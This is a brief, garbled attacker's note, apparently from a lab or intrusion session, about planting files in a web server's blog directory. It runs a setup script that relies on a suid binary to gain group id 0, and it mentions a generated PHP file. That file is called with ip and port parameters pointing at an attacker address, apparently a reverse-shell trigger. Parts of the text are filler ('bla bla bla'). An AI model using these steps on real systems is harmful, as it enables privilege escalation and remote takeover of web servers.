# 
#script not owend by me 
#bla sda3 rass 

```
./setup.sh /var/www/html/blog sexlovegod X 0 # 'X' and '0' since extended attribute doesn't really matter,
                                             # and our suid binary will set our gid to 0
```

#generate php  bla bla bla ...
http://127.0.0.1/XXXXX.php?ip=ataIP&port=8999
